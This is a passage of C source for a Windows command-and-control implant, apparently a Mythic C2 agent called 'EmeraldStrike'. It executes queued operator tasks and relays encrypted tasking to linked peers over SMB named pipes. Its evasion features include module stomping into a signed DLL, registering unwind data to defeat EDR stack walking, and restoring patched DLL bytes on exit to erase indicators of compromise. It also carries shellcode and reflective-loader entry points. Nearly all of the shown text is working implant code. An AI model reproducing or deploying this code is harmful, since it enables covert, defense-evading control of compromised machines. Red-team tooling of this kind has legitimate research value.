            es_free(inst, get_msg);
        }

        if (tasks && tasks_len > 0) {
            // Iterate ALL task TLV triples (COMMAND/TASKID/DATA) in the
            // get_tasking reply - Mythic delivers the whole queued batch in one
            // response and every task must be executed or it stays "agent
            // processing" server-side forever.
            DWORD tpos = 0;
            while (tpos + 5 <= tasks_len) {
                BYTE t = tasks[tpos];
                DWORD len = ((DWORD)tasks[tpos+1] << 24) | ((DWORD)tasks[tpos+2] << 16) |
                            ((DWORD)tasks[tpos+3] << 8)  | tasks[tpos+4];
                tpos += 5;
                if (tpos + len > tasks_len) break;
                if (t != TLV_COMMAND) { tpos += len; continue; }

                // task boundary found: parse this triple
                const BYTE* cmd_name = tasks + tpos; DWORD cmd_name_len = len;
                tpos += len;

                const BYTE* task_id = NULL; DWORD task_id_len = 0;
                const BYTE* task_data = NULL; DWORD task_data_len = 0;
                // find the TASKID (next TLV) then optional DATA before the next COMMAND
                DWORD scan = tpos;
                while (scan + 5 <= tasks_len) {
                    BYTE st = tasks[scan];
                    DWORD slen = ((DWORD)tasks[scan+1] << 24) | ((DWORD)tasks[scan+2] << 16) |
                                 ((DWORD)tasks[scan+3] << 8)  | tasks[scan+4];
                    scan += 5;
                    if (scan + slen > tasks_len) break;
                    if (st == TLV_TASKID) {
                        task_id = tasks + scan; task_id_len = slen;
                    } else if (st == TLV_DATA && task_id) {
                        task_data = tasks + scan; task_data_len = slen;
                    } else if (st == TLV_COMMAND) {
                        scan -= 5;  // rewind: the header belongs to the NEXT task
                        break;
                    }
                    scan += slen;
                }

                char cmd_buf[64] = {0};
                if (cmd_name_len < sizeof(cmd_buf))
                    es_memcpy(cmd_buf, (PVOID)cmd_name, cmd_name_len);

                char tid_buf[40] = {0};
                if (task_id && task_id_len < sizeof(tid_buf))
                    es_memcpy(tid_buf, (PVOID)task_id, task_id_len);
                else
                    tid_buf[0] = 0;

                BYTE* out_data = NULL;
                DWORD out_len = 0;
                BOOL  out_error = FALSE;

                dispatch_command(inst, cmd_buf, (BYTE*)task_data, task_data_len,
                                 &out_data, &out_len, &out_error);

                DWORD resp_msg_len = 0;
                BYTE* resp_msg = build_response_msg(inst, tid_buf, out_data, out_len,
                                                     out_error, &resp_msg_len);
                if (resp_msg) {
                    BOOL sentOk = send_mythic_msg(inst, resp_msg, resp_msg_len, NULL, NULL);
                    es_free(inst, resp_msg);
                }
                if (out_data) es_free(inst, out_data);

                // skip to the next COMMAND TLV
                tpos = scan;
            }

            // ── Delegate forwarding via TLV_DELEGATES in tasking response ──
            // The translator packs Mythic delegates as TLV_DELEGATES(0x1B) containing
            // ACTION_LINK_MSG binary data for linked peers.
            const BYTE* del_blob = NULL; DWORD del_blob_len = 0;
            BOOL found_del = tlv_find(tasks, tasks_len, TLV_DELEGATES, &del_blob, &del_blob_len);
            {
                // DEBUG: report delegate TLV presence back through a marker TLV
                const char* dbg = found_del ? "ESDBG:del_found" : "ESDBG:del_missing";
                DWORD my_ulen = es_strlen(inst->Config.uuid);
                xstr(_dbgact, "get_tasking");
                BYTE* dbg_msg = (BYTE*)es_malloc(inst, tlv_size(my_ulen) + tlv_size(11) + tlv_size(20));
                if (dbg_msg) {
                    DWORD dmp = 0;
                    tlv_pack(dbg_msg + dmp, TLV_UUID, (const BYTE*)inst->Config.uuid, my_ulen); dmp += tlv_size(my_ulen);
                    tlv_pack(dbg_msg + dmp, TLV_COMMAND, (const BYTE*)_dbgact, 11); dmp += tlv_size(11);
                    tlv_pack(dbg_msg + dmp, 0x7F, (const BYTE*)dbg, es_strlen((char*)dbg)); dmp += tlv_size(es_strlen((char*)dbg));
                    send_mythic_msg(inst, dbg_msg, dmp, NULL, NULL);
                    es_free(inst, dbg_msg);
                }
            }
            if (found_del && del_blob_len > 1 && del_blob[0] == ACTION_LINK_MSG) {
                DWORD dpos = 1;  // skip action byte
                while (dpos + 4 < del_blob_len) {
                    // Parse peer UUID (length-prefixed string)
                    DWORD uuid_len = ((DWORD)del_blob[dpos] << 24) | ((DWORD)del_blob[dpos+1] << 16) |
                                     ((DWORD)del_blob[dpos+2] << 8)  | del_blob[dpos+3];
                    dpos += 4;
                    if (dpos + uuid_len + 4 > del_blob_len) break;
                    const char* peer_uuid = (const char*)(del_blob + dpos);
                    dpos += uuid_len;

                    // Parse message blob (length-prefixed bytes)
                    DWORD msg_blob_len = ((DWORD)del_blob[dpos] << 24) | ((DWORD)del_blob[dpos+1] << 16) |
                                         ((DWORD)del_blob[dpos+2] << 8)  | del_blob[dpos+3];
                    dpos += 4;
                    if (dpos + msg_blob_len > del_blob_len) break;
                    const BYTE* msg_blob = del_blob + dpos;
                    dpos += msg_blob_len;

                    // Find matching linked peer.
                    // UUID tracking: after the peer's delegate checkin, Mythic
                    // re-assigns its callback UUID. Delegates then arrive with
                    // the NEW uuid, which won't match the handshake-time uuid
                    // stored in LinkedPeers. If no exact match, fall back to
                    // the first active peer and adopt the delegate's uuid.
                    BOOL relay_done = FALSE; const char* relay_fail = "no_peer_match";
                    int match_pi = -1;
                    int first_active = -1;
                    for (int pi = 0; pi < ES_MAX_LINKED_PEERS; pi++) {
                        if (!inst->LinkedPeers[pi].active) continue;
                        if (first_active < 0) first_active = pi;
                        DWORD pu_len = es_strlen(inst->LinkedPeers[pi].uuid);
                        if (pu_len != uuid_len) continue;
                        BOOL match = TRUE;
                        for (DWORD ci = 0; ci < pu_len; ci++) {
                            if (inst->LinkedPeers[pi].uuid[ci] != (char)peer_uuid[ci]) { match = FALSE; break; }
                        }
                        if (match) { match_pi = pi; break; }
                    }
                    if (match_pi < 0 && first_active >= 0) {
                        // Adopt the delegate's uuid as this peer's current identity
                        match_pi = first_active;
                        DWORD cp = 0;
                        for (DWORD uc = 0; uc < uuid_len && cp < sizeof(inst->LinkedPeers[match_pi].uuid) - 1; uc++)
                            inst->LinkedPeers[match_pi].uuid[cp++] = (char)peer_uuid[uc];
                        inst->LinkedPeers[match_pi].uuid[cp] = 0;
                        relay_fail = "uuid_adopted";
                    }
                    if (match_pi >= 0) {
                        int pi = match_pi;

                        // Forward: prepend DELEGATE_RELAY_MAGIC, encrypt under link
                        // session key, send over pipe, read response, relay back
                        DWORD relay_len = 1 + msg_blob_len;
                        BYTE* relay_buf = (BYTE*)es_malloc(inst, relay_len);
                        if (relay_buf) {
                            relay_buf[0] = DELEGATE_RELAY_MAGIC;
                            if (msg_blob_len > 0)
                                es_memcpy(relay_buf + 1, (PVOID)msg_blob, msg_blob_len);

                            // Encrypt with our AES key (link session key)
                            BYTE* enc_relay = NULL; DWORD enc_relay_len = 0;
                            BOOL sent_ok = FALSE;
                            if (mythic_encrypt(inst, relay_buf, relay_len, &enc_relay, &enc_relay_len) && enc_relay) {
                                // DEBUG: check pipe state before write
                                DWORD peek_avail = 0;
                                BOOL peek_ok = inst->Win32.PeekNamedPipe(inst->LinkedPeers[pi].pipe, NULL, 0, NULL, &peek_avail, NULL);
                                if (!peek_ok) {
                                    static char pf_buf[32];
                                    DWORD perr = inst->Win32.GetLastError();
                                    es_strcpy(pf_buf, XSTR("peek_fail_"));
                                    char pd[12] = {0}; int pdi = 0;
                                    if (!perr) pd[pdi++] = '0';
                                    while (perr && pdi < 11) { pd[pdi++] = '0' + (perr % 10); perr /= 10; }
                                    for (int fc = 0; fc < pdi; fc++) pf_buf[10 + fc] = pd[pdi - 1 - fc];
                                    pf_buf[10 + pdi] = 0;
                                    relay_fail = pf_buf;
                                } else {
                                    sent_ok = smb_send_frame(inst, inst->LinkedPeers[pi].pipe, enc_relay, enc_relay_len);
                                    if (!sent_ok) {
                                        DWORD werr = inst->Win32.GetLastError();
                                        relay_fail = "send_fail";
                                        char digits[12] = {0}; int di2 = 0;
                                        if (!werr) digits[di2++] = '0';
                                        while (werr && di2 < 11) { digits[di2++] = '0' + (werr % 10); werr /= 10; }
                                        static char fail_buf[32];
                                        es_strcpy(fail_buf, XSTR("send_fail_"));
                                        for (int fc = 0; fc < di2; fc++) fail_buf[10 + fc] = digits[di2 - 1 - fc];
                                        fail_buf[10 + di2] = 0;
                                        relay_fail = fail_buf;
                                    }
                                }
                                es_free(inst, enc_relay);
                            } else {
                                relay_fail = "enc_fail";
                            }
                            es_free(inst, relay_buf);

                            if (sent_ok) {
                            // Read peer response
                            BYTE* peer_resp = NULL; DWORD peer_resp_len = 0;
                            smb_recv_frame(inst, inst->LinkedPeers[pi].pipe, &peer_resp, &peer_resp_len);
                            if (peer_resp && peer_resp_len > 0) {
                                // Decrypt the link-session-key layer to get raw response
                                BYTE* dec_resp = NULL; DWORD dec_resp_len = 0;
                                if (mythic_decrypt(inst, peer_resp, peer_resp_len, &dec_resp, &dec_resp_len) && dec_resp) {
                                    // UUID tracking: the peer's response carries its CURRENT
                                    // Config.uuid (TLV_UUID). After the peer processes its
                                    // checkin response, Mythic assigns a new callback UUID -
                                    // update our peer table so future delegates match.
                                    const BYTE* resp_uuid = NULL; DWORD resp_uuid_len = 0;
                                    if (tlv_find(dec_resp, dec_resp_len, TLV_UUID, &resp_uuid, &resp_uuid_len) &&
                                        resp_uuid_len > 0 && resp_uuid_len < sizeof(inst->LinkedPeers[pi].uuid)) {
                                        BOOL uuid_changed = FALSE;
                                        DWORD old_len = es_strlen(inst->LinkedPeers[pi].uuid);
                                        if (old_len != resp_uuid_len) uuid_changed = TRUE;
                                        else {
                                            for (DWORD uc = 0; uc < old_len; uc++) {
                                                if (inst->LinkedPeers[pi].uuid[uc] != (char)resp_uuid[uc]) { uuid_changed = TRUE; break; }
                                            }
                                        }
                                        if (uuid_changed) {
                                            DWORD cp = 0;
                                            for (DWORD uc = 0; uc < resp_uuid_len && cp < sizeof(inst->LinkedPeers[pi].uuid) - 1; uc++)
                                                inst->LinkedPeers[pi].uuid[cp++] = (char)resp_uuid[uc];
                                            inst->LinkedPeers[pi].uuid[cp] = 0;
                                            relay_fail = "uuid_updated";
                                        }
                                    }
                                    // Queue ACTION_LINK_MSG response for the next get_tasking
                                    // (piggybacked via TLV_DELEGATES, same as ACTION_LINK_ADD)
                                    DWORD action_msg_len = 1 + 4 + uuid_len + 4 + dec_resp_len;
                                    BYTE* action_msg = (BYTE*)es_malloc(inst, action_msg_len);
                                    if (action_msg) {
                                        DWORD ap = 0;
                                        action_msg[ap++] = ACTION_LINK_MSG;
                                        pack_be32(action_msg + ap, uuid_len); ap += 4;
                                        es_memcpy(action_msg + ap, (PVOID)peer_uuid, uuid_len); ap += uuid_len;
                                        pack_be32(action_msg + ap, dec_resp_len); ap += 4;
                                        es_memcpy(action_msg + ap, dec_resp, dec_resp_len); ap += dec_resp_len;
                                        queue_pending_msg(inst, action_msg, ap);
                                        if (!relay_fail || relay_fail == (const char*)NULL) relay_done = TRUE;
                                        relay_done = TRUE;
                                    }
                                    es_free(inst, dec_resp);
                                } else {
                                    relay_fail = "decrypt_fail";
                                }
                                es_free(inst, peer_resp);
                            } else {
                                relay_fail = "no_peer_resp";
                            }
                            }  // end if (sent_ok)
                        } else {
                            relay_fail = "alloc_fail";
                        }
                        break;
                    }
                    {
                        // DEBUG: relay result marker + uuid bytes
                        DWORD my_ulen2 = es_strlen(inst->Config.uuid);
                        xstr(_dbgact2, "get_tasking");
                        char dbg2[160] = {0};
                        es_strcpy(dbg2, XSTR("ESDBG:relay:"));
                        es_strcpy(dbg2 + es_strlen(dbg2), relay_fail);
                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR(" linked=["));
                        es_strcpy(dbg2 + es_strlen(dbg2), inst->LinkedPeers[0].uuid);
                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR("] deleg=["));
                        // copy delegate uuid safely (not null-terminated in blob)
                        DWORD ds = 0;
                        for (ds = 0; ds < uuid_len && ds < 40; ds++)
                            dbg2[es_strlen(dbg2)] = peer_uuid[ds];
                        dbg2[es_strlen(dbg2)] = 0;
                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR("] ulen="));
                        char ul[8] = {0};
                        int uvi = 0;
                        if (!uuid_len) ul[uvi++] = '0';
                        DWORD ut = uuid_len;
                        while (ut && uvi < 7) { ul[uvi++] = '0' + (ut % 10); ut /= 10; }
                        while (uvi > 0) { char c = ul[--uvi]; ul[uvi] = 0; /* reverse below */ }
                        // simple reverse into dbg
                        {
                            char rev[8] = {0};
                            int rl2 = 0;
                            ut = uuid_len;
                            if (!ut) rev[rl2++] = '0';
                            while (ut && rl2 < 7) { rev[rl2++] = '0' + (ut % 10); ut /= 10; }
                            while (rl2 > 0) dbg2[es_strlen(dbg2)] = rev[--rl2];
                        }
                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR(" active0="));
                        dbg2[es_strlen(dbg2)] = inst->LinkedPeers[0].active ? '1' : '0';
                        BYTE* dbg_msg2 = (BYTE*)es_malloc(inst, tlv_size(my_ulen2) + tlv_size(11) + tlv_size(170));
                        if (dbg_msg2) {
                            DWORD dmp = 0;
                            tlv_pack(dbg_msg2 + dmp, TLV_UUID, (const BYTE*)inst->Config.uuid, my_ulen2); dmp += tlv_size(my_ulen2);
                            tlv_pack(dbg_msg2 + dmp, TLV_COMMAND, (const BYTE*)_dbgact2, 11); dmp += tlv_size(11);
                            tlv_pack(dbg_msg2 + dmp, 0x7F, (const BYTE*)dbg2, es_strlen(dbg2)); dmp += tlv_size(es_strlen(dbg2));
                            send_mythic_msg(inst, dbg_msg2, dmp, NULL, NULL);
                            es_free(inst, dbg_msg2);
                        }
                        if (relay_done) break;
                    }
                }
            }
        }

        if (tasks) es_free(inst, tasks);

        do_sleep(inst, inst->Config.sleep_ms);
    }
#else
#endif // HTTP_TRANSPORT

#ifdef SMB_TRANSPORT
    // SMB P2P: serve the named pipe (link handshake + encrypted peer tasking)
    // in a blocking loop until inst->Running goes FALSE.
    smb_server_loop(inst);
#endif

    if (inst->ExitFunc == 1) {
#ifdef INCLUDE_EVASION_MODULE_SHIFT
#ifdef _WIN64
        // Module shifting: restore the sacrifice DLL's original .text/.pdata
        // bytes before the process dies, erasing the Modified-Code IoC.
        // Only acts when a shift-mode backup exists (one-shot guarded).
        module_shift_restore(inst);
#endif
#endif
        inst->Win32.ExitProcess(0);
    } else {
#ifdef INCLUDE_EVASION_MODULE_SHIFT
#ifdef _WIN64
        module_shift_restore(inst);
#endif
#endif
        gate_ExitThread(inst, 0);
    }
}

// DllMain - handles UDRL protocol: DLL_BEACON_USER_DATA → DLL_PROCESS_ATTACH → DLL_BEACON_START
#ifdef DLL_MODE
static DWORD WINAPI _agent_thread(LPVOID param) {
    agent_main((PINSTANCE)param);
    return 0;
}

extern "C"
#else
__attribute__((section(".text$A")))
#endif
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
#ifdef DLL_MODE
    PINSTANCE inst = &g_DllInstance;
    if (!g_DllInitialized) {
        es_memset(inst, 0, sizeof(INSTANCE));
        g_DllInitialized = TRUE;
    }
#else
    PINSTANCE inst = EMERALDSTRIKE_INSTANCE;
#endif

    switch (dwReason) {
        case DLL_BEACON_USER_DATA:
            if (lpReserved) {
                es_memcpy(&inst->savedUserData, lpReserved, sizeof(USER_DATA));
                inst->pUserData = &inst->savedUserData;
                if (inst->pUserData->allocatedMemory) {
                    es_memcpy(&inst->BeaconInfo.allocatedMemory,
                              inst->pUserData->allocatedMemory,
                              sizeof(ALLOCATED_MEMORY));
                }
            }
            break;

        case DLL_PROCESS_ATTACH:
            agent_init(inst, hDll);
            DBG(inst, "[ES] DLL_PROCESS_ATTACH done");
#ifdef DLL_MODE
            if (!inst->pUserData) {
                gate_CreateThread(inst, NULL, 0, (LPTHREAD_START_ROUTINE)_agent_thread, inst, 0, NULL);
            }
#endif
            break;

        case DLL_BEACON_START:
            DBG(inst, "[ES] DLL_BEACON_START");
            agent_main(inst);
            break;
    }
    return TRUE;
}

#ifndef DLL_MODE
// C entry point called from ASM - for standalone PIC mode (no UDRL)
EXTERN_C VOID main_entry(PVOID base_addr) {
    PINSTANCE inst = EMERALDSTRIKE_INSTANCE;
    es_memset(inst, 0, sizeof(INSTANCE));
    inst->Base.Buffer = base_addr;
    // resolve_apis is inside agent_init - call resolve_apis first so the trace
    // helper has its API pointers, then trace.
    resolve_apis(inst);

    // Compute Base.Length: total shellcode size from _start through __InstanceStorage.
    // __InstanceStorage (16384 bytes) is at the end of the .text blob.
    // INSTANCE pointer from _get_instance() points into __InstanceStorage.
    // Total length = (INSTANCE address + sizeof(INSTANCE) padding) - base_addr.
    // More precisely: __InstanceStorage is INSTANCE_STORAGE_SIZE bytes, and the
    // INSTANCE lives at the start of it. Total blob =
    // (PBYTE)inst + INSTANCE_STORAGE_SIZE - (PBYTE)base_addr.
    inst->Base.Length = (ULONG)((PBYTE)inst + INSTANCE_STORAGE_SIZE - (PBYTE)base_addr);

    // ── Register the blob's unwind data (RtlAddFunctionTable) ──
    // The flat blob has no PE headers, so the loader never sees an exception
    // directory and every stack walk (EDR stack walking, RtlCaptureStackBackTrace,
    // exception dispatch) stops at the first agent frame. entry.x64.asm stores
    // the .pdata link VMAs in .instdata next to __Instance; runtime address =
    // base_addr + link VMA (the blob is copied verbatim, so link RVAs == offsets).
    {
        // .instdata layout (entry.x64.asm): [PdataStartPtr dq][PdataEndPtr dq]
        // [__Instance_offset dd][pad 4][__Instance dq][16KB storage]
        // inst = storage start -> PdataEndPtr at inst-20, PdataStartPtr at inst-28.
        PVOID* pPdataStart = (PVOID*)((PBYTE)inst - 28);
        PVOID* pPdataEnd   = (PVOID*)((PBYTE)inst - 20);
        ULONG_PTR linkStart = (ULONG_PTR)*pPdataStart;
        ULONG_PTR linkEnd   = (ULONG_PTR)*pPdataEnd;
        if (linkStart && linkEnd > linkStart && linkEnd < 0x08000000ULL &&
            (linkEnd - linkStart) % 12 == 0) {
            typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PVOID, DWORD, ULONG64);
            xstr(_raft2, "RtlAddFunctionTable");
            fnRtlAddFunctionTable_t pAddFT = (fnRtlAddFunctionTable_t)(void*)resolve_function(
                inst->Modules.Ntdll, hash_string_djb2(_raft2));
            if (pAddFT) {
                // The unwinder binary-searches the table - it MUST be sorted by
                // BeginAddress. Link order is not address order (e.g. the _start
                // stub lands in .text$B after .text$A), so sort in place first
                // (insertion sort; a few hundred entries, runs once).
                PRUNTIME_FUNCTION rf = (PRUNTIME_FUNCTION)((PBYTE)base_addr + linkStart);
                DWORD rfCount = (DWORD)((linkEnd - linkStart) / 12);
                for (DWORD i = 1; i < rfCount; i++) {
                    RUNTIME_FUNCTION key = rf[i];
                    DWORD j = i;
                    while (j > 0 && rf[j - 1].BeginAddress > key.BeginAddress) {
                        rf[j] = rf[j - 1];
                        j--;
                    }
                    rf[j] = key;
                }
                inst->dwUnwindRegResult =
                    pAddFT((PVOID)((PBYTE)base_addr + linkStart),
                           rfCount,
                           (ULONG64)(UINT_PTR)base_addr) ? 2 : 3;
            } else {
                inst->dwUnwindRegResult = 4;
            }
        } else {
            inst->dwUnwindRegResult = 5;  // sanity fail
        }
    }

    agent_init(inst, (HINSTANCE)base_addr);

#ifdef INCLUDE_EVASION_MODULE_STOMP
#ifdef _WIN64
    // Module stomping: copy the agent into a signed DLL's .text section.
    // Must run after agent_init (needs resolved APIs, parsed config, evasion patches).
    // If successful, module_stomp_init transfers execution to the stomped copy's
    // agent_main and does NOT return. If it fails, we fall through to agent_main
    // from the original allocation.
    if (inst->Base.Length > 0 && !inst->ModuleStomp.bEntryPatched) {
        if (module_stomp_init(inst)) {
            // Execution was transferred; we should not reach here.
            // But if we do (e.g. agent_main returned), just exit.
            TRACE(inst, "main_entry: module_stomp_init returned TRUE (transfer)");
            return;
        }
        TRACE(inst, "main_entry: module_stomp_init returned FALSE");
        DBG(inst, "[ES] ModuleStomp failed, continuing from original allocation");
    }
#endif
#endif

    /* NOTE: INCLUDE_EVASION_CLEANUP does not apply here. In standalone PIC mode
       base_addr is the allocation holding this agent's own .text and instance
       storage (the linker script merges everything into one .text that the
       builder dumps as shellcode). discover_shellcode_alloc/cleanup_shellcode
       would VirtualProtect it PAGE_READWRITE, zero and free it while we are
       still executing inside it - instant AV on the next instruction fetch. */

    agent_main(inst);
    TRACE(inst, "main_entry: agent_main returned");
}
#endif
